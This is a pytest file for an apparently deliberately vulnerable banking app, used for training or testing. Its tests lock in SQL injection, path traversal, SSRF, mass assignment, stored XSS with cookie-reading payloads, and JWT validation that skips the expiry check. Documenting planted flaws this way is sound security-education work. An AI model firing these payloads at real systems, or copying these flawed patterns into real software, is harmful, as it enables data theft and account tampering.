"""LOCK-IN: injection / mass-assignment / SSRF / path-traversal / stored-XSS,
plus the inconsistent-JWT-validation contrast. Docstrings map each test to its
README INTENTIONALLY VULNERABLE row.
"""

import pytest

from conftest import auth_headers


# --------------------------- SQL injection ---------------------------

def test_sqli_single_quote_breaks_query_500(client, alice):
    """README: a bare single quote breaks the f-string-built raw SQL -> 500,
    proving string concatenation rather than a bound parameter."""
    r = client.get("/api/accounts/accounts/search", headers=alice["headers"], params={"q": "'"})
    assert r.status_code == 500


def test_sqli_tautology_returns_all_accounts(client, alice):
    """README: the tautology  x%' OR '1'='1' --  closes the string, forces a
    true condition and comments out the rest, returning every account (full
    SSNs and all), not just the caller's two."""
    r = client.get("/api/accounts/accounts/search", headers=alice["headers"],
                   params={"q": "x%' OR '1'='1' -- "})
    assert r.status_code == 200
    rows = r.json()
    assert len(rows) >= 10  # all seeded accounts
    assert len({row["user_id"] for row in rows}) > 1  # spans multiple owners


# --------------------------- path traversal ---------------------------

def test_path_traversal_reads_outside_statements_dir(client, alice):
    """README: an unsanitized ?file= escapes the statements/ directory. Reading
    ../etc/hostname returns non-CSV content (a single-line hostname)."""
    r = client.get("/api/accounts/accounts/3/statement", headers=alice["headers"],
                   params={"file": "../../../../../../etc/hostname"})
    assert r.status_code == 200
    body = r.text.strip()
    assert body                    # something outside statements/ was read
    assert "\n" not in body        # a lone hostname, not the multi-line CSV
    assert "," not in body         # and not CSV-shaped


# --------------------------- SSRF ---------------------------

def test_ssrf_fetches_and_reflects_internal_service(client, alice):
    """README: link-external fetches a fully attacker-controlled URL server-side
    and reflects the response -- useful for scanning internal services. We hit
    the internal auth service's health endpoint."""
    r = client.post("/api/accounts/accounts/link-external", headers=alice["headers"],
                    json={"account_id": 3, "verification_url": "http://auth:8000/health"})
    assert r.status_code == 200
    body = r.json()
    assert body["status_code"] == 200
    assert "ok" in body["body_snippet"]  # reflected from the internal service


# --------------------------- mass assignment ---------------------------

def test_mass_assignment_sets_any_account_balance(client, alice):
    """README: PATCH /accounts/{id} mass-assigns balance_cents with no ownership
    check. alice sets account 2's (admin's) balance."""
    r = client.patch("/api/accounts/accounts/2", headers=alice["headers"],
                     json={"balance_cents": 999999999})
    assert r.status_code == 200
    g = client.get("/api/accounts/accounts/2", headers=alice["headers"])
    assert g.json()["balance_cents"] == 999999999


# --------------------------- stored XSS ---------------------------

def test_stored_xss_transfer_memo_roundtrips_raw(client, alice):
    """README: a transfer memo is stored verbatim and served back raw from
    GET /transfers (the frontend renders it via dangerouslySetInnerHTML)."""
    payload = "<img src=x onerror=alert(document.cookie)>"
    client.post("/api/transfers/transfers", headers=alice["headers"], json={
        "from_account_id": 3, "to_account_id": 5, "amount_cents": 100, "memo": payload,
    })
    r = client.get("/api/transfers/transfers", headers=alice["headers"], params={"account_id": 3})
    assert r.status_code == 200
    memos = [t["memo"] for t in r.json()]
    assert payload in memos  # stored and returned unescaped


def test_stored_xss_support_message_roundtrips_raw(client, alice):
    """README: a support ticket message body is stored verbatim and served back
    raw (the agent console renders it via dangerouslySetInnerHTML)."""
    payload = "<script>alert(document.cookie)</script>"
    client.post("/api/support/tickets/1/messages", headers=alice["headers"],
                json={"sender": "customer", "body": payload})
    r = client.get("/api/support/tickets/1", headers=alice["headers"])
    assert r.status_code == 200
    bodies = [m["body"] for m in r.json()["messages"]]
    assert payload in bodies  # stored and returned unescaped


# --------------- inconsistent JWT validation (support skips exp) ---------------

def test_malformed_bearer_rejected_by_accounts(client):
    """Baseline contrast for the support exp-skipping gap: accounts-service
    validates the RS256 signature, so a malformed bearer is rejected (401).
    (The gap is that support skips ONLY the exp claim -- see the skipped test
    below for why the expired-token contrast can't be shown black-box.)"""
    r = client.get("/api/accounts/accounts", headers=auth_headers("garbage.token.value"))
    assert r.status_code == 401


def test_malformed_bearer_rejected_by_support(client):
    """Both services still verify the signature: support also 401s a malformed
    bearer. This pins down that the ONLY difference between the two is support's
    verify_exp=False, isolating the intentional gap."""
    r = client.get("/api/support/tickets", headers=auth_headers("garbage.token.value"))
    assert r.status_code == 401


@pytest.mark.skip(reason=(
    "Locking in support-service's verify_exp=False (expired token accepted by "
    "support, rejected by accounts) requires a validly-SIGNED but EXPIRED RS256 "
    "token. That can't be produced black-box: /login always mints exp=now+"
    "JWT_EXPIRE_MINUTES (15m by default), the RS256 private key lives only in "
    "auth-service's docker volume, and tampering the exp claim breaks the "
    "signature (so support 401s too, since it still verifies the signature -- "
    "see test_malformed_bearer_rejected_by_support). Demonstrating support 200 "
    "vs accounts 401 on the SAME expired token needs an auth-side short-expiry "
    "token fixture (e.g. JWT_EXPIRE_MINUTES=0 or an internal mint endpoint). "
    "The gap is asserted at code level in services/support/app/security.py: "
    "jwt.decode(..., options={'verify_exp': False})."
))
def test_support_accepts_expired_token_but_accounts_rejects():
    pass
